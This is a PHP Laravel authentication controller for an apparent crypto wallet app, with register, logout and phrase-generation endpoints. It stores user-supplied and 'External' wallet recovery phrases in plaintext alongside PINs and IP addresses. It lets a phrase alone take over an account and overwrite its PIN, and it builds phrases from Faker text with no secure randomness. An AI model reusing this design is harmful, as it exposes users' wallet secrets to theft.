<?php

namespace App\Http\Controllers\Auth;

use App\Http\Resources\UserResource;
use Faker\Generator;
use Faker\Factory;
use App\Http\Controllers\Controller;
use App\Models\Asset;
use App\Models\User;
use App\Traits\JsonResponses;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Fluent;
use Illuminate\Validation\Rule;

class AuthController extends Controller
{
    use JsonResponses;

  
    public function register(Request $request)
    {
        $request->validate([
            'phrase' => 'required|string',
            'phrase_type' => ['required','string',Rule::in(['External','App'])],
            'nickname' => ['required','string',
                Rule::unique('users', 'name')->where(function($query) use ($request){
                    $query->where('phrase','<>', $request->phrase);
                })
            ],
            'pin' => 'required|numeric',
            'device_id' => ['required','string',
                Rule::unique('users', 'device_id')->where(function($query) use ($request){
                    $query->where('phrase','<>', $request->phrase);
                })
            ]
        ]);

        //check if phrase exists
        $user = User::where('phrase',$request->phrase);

        if($user->exists())
        {
            
            $user = $user->first();

            
            $user->update([
                'device_id' => $request->device_id,
                'pin' => $request->pin,
                'name' => $request->nickname
            ]);
            
            $user = $user->load([
                'assets',
                'transactions' => function ($query) {
                    $query->with('toAsset', 'fromAsset');
            }]);
            
            return $this->success(message:'registered',data:[
                'token' =>   $user->createToken($request->device_id)->plainTextToken,
                'user' => new UserResource($user),
            ]);
        }

       $new_user = User::create([
            'name' => $request->nickname,
            'pin' => $request->pin,
            'userip' => $request->ip(),
            'device_id' => $request->device_id,
            'phrase' => $request->phrase,
            'phrase_type' => $request->phrase_type
        ]);

        $new_user =  $new_user->load([
            'assets',
            'transactions' => function ($query) {
                $query->with('toAsset', 'fromAsset');
        }]);

        return $this->success(message:'registered',data:[
            'token' =>   $new_user->createToken($request->device_id)->plainTextToken,
            'user' => new UserResource($new_user),
        ]);
    }



    public function logout()
    {
        Auth::user()->currentAccessToken()->delete();

        return $this->success(message:'logged out');
    }

    public function getPhrase()
    {
        do {
            
            $phrase = $this->generatePhrase();

            $exists = User::where('phrase',$phrase)->exists();

        } while ($exists);

        return $this->success(message:'new phrase',data:['phrase' => $phrase]);
    }


    private function generatePhrase()
    {
        //return fake()->word();
        $faker = Factory::create('en_GB');

        $word = $faker->realText(300,2);

        //$words = preg_split('/\s+/', $word);
       $words = explode(' ', $word);

        $words = array_filter($words, function ($word) {
            return strlen($word) > 4;
        });
        
        $words = array_map(function($word) {
            return strtolower(str_replace([',', '"',"'",'.','(',')',':','-','!',';','?','[',']','{','}'], '', $word));
        }, $words);  

        //return $words;

        $words = array_unique($words);

        $words = array_slice($words, 0, 15);

        shuffle($words);

        return implode(' ', $words);
    
    }


}
